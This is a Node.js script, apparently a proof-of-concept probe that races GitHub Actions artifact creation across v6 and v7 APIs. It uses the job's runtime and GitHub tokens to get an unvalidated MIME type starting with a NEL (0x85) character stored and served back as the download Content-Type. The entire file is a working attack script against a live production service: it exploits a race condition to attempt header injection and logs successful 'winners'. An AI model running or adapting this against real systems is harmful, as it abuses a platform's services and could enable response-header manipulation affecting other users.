// v6/v7 confusion race: v6 accepts an unvalidated NEL mime; v7 applies the
// stored mime as rsct. Create the SAME name as both, race the finalizes, and
// check whether any resulting artifact serves a Content-Type carrying 0x85.
import crypto from 'node:crypto';
import https from 'node:https';

const RESULTS = process.env.ACTIONS_RESULTS_URL;
const RT = process.env.ACTIONS_RUNTIME_TOKEN;
const GH = process.env.GH_TOKEN;
const REPO = process.env.GITHUB_REPOSITORY;
if (!RESULTS || !RT) { console.log('FATAL missing ACTIONS_* env'); process.exit(1); }
const claims = JSON.parse(Buffer.from(RT.split('.')[1], 'base64url').toString());
const scope = String(claims.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
const [, runId, jobId] = scope.split(':');

const WEIRD = '\u0085application/json';   // leading NEL
const CLEAN = 'application/json';
const ROUNDS = Number(process.env.ROUNDS || 64);
const PLACEHOLDER = Buffer.from('{"probe":"placeholder"}');

function twirp(method, body) {
  return fetch(`${RESULTS.replace(/\/?$/, '/')}twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${RT}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }).then(async r => ({ status: r.status, text: await r.text() }));
}
function put(url, data, ct) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const h = { 'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2021-08-06', 'Content-Length': Buffer.byteLength(data) };
    if (ct) h['x-ms-blob-content-type'] = ct;
    const req = https.request({ method: 'PUT', hostname: u.hostname, path: u.pathname + u.search, headers: h },
      res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
    req.on('error', reject); req.write(data); req.end();
  });
}
function create(name, version, mime) {
  return twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version, mime_type: mime });
}
function finalize(name, bytes) {
  return twirp('FinalizeArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name,
    size: String(bytes.length), hash: `sha256:${crypto.createHash('sha256').update(bytes).digest('hex')}` });
}
function restDownload(id) {
  return new Promise(resolve => {
    https.request({ method: 'GET', hostname: 'api.github.com', path: `/repos/${REPO}/actions/artifacts/${id}/zip`,
      headers: { Accept: 'application/vnd.github.v3+json', Authorization: `Bearer ${GH}`, 'User-Agent': 'race2' } },
      res => {
        res.resume();
        const loc = res.headers.location;
        if (!loc) return resolve({ noloc: res.statusCode });
        const u = new URL(loc);
        const rsct = (u.search.match(/[?&]rsct=([^&]*)/) || [])[1] || '';
        https.get({ hostname: u.hostname, path: u.pathname + u.search, headers: { 'User-Agent': 'race2' } }, r2 => {
          r2.resume();
          const ct = r2.headers['content-type'] || '';
          resolve({ rsct, ct, hex: Buffer.from(ct, 'latin1').toString('hex'), nel: Buffer.from(ct, 'latin1').includes(0x85) });
        }).on('error', e => resolve({ rsct, err: String(e) }));
      }).on('error', e => resolve({ err: String(e) })).end();
  });
}

const winners = [];
for (let i = 0; i < ROUNDS; i++) {
  const name = `cr-${i}-${Date.now()}`;
  const reverse = i % 2 === 1;
  const specs = reverse ? [[7, CLEAN], [6, WEIRD]] : [[6, WEIRD], [7, CLEAN]];
  try {
    const created = await Promise.all(specs.map(([v, m]) => create(name, v, m)));
    const sas = created.map(c => { try { return JSON.parse(c.text).signed_upload_url; } catch { return null; } });
    if (sas.some(s => !s)) { console.log(`r${i} create status=${created.map(c=>c.status)} NO-SAS`); continue; }
    await Promise.all(sas.map(s => put(s, PLACEHOLDER, WEIRD)));
    const fin = await Promise.allSettled([finalize(name, PLACEHOLDER), finalize(name, PLACEHOLDER)]);
    const ids = [...new Set(fin.filter(f => f.status === 'fulfilled' && f.value.status === 200)
      .map(f => { try { return JSON.parse(f.value.text).artifact_id; } catch { return null; } }).filter(Boolean))];
    if (!ids.length) { console.log(`r${i} fin=${fin.map(f=>f.status==='fulfilled'?f.value.status:'rej')} NO-ID`); continue; }
    for (const id of ids) {
      const d = await restDownload(id);
      console.log(`r${i} rev=${reverse} id=${id} rsct=${(d.rsct||'').slice(0,34)} hex=${(d.hex||'').slice(0,44)} NEL=${d.nel}`);
      if (d.nel) winners.push({ i, id, ...d });
    }
  } catch (e) { console.log(`r${i} EXC ${String(e).slice(0,80)}`); }
}
console.log(`\n=== WINNERS ${winners.length} ===`);
for (const w of winners) console.log('WINNER ' + JSON.stringify(w));
console.log(winners.length ? '*** NEL rsct ACHIEVED ***' : 'none');
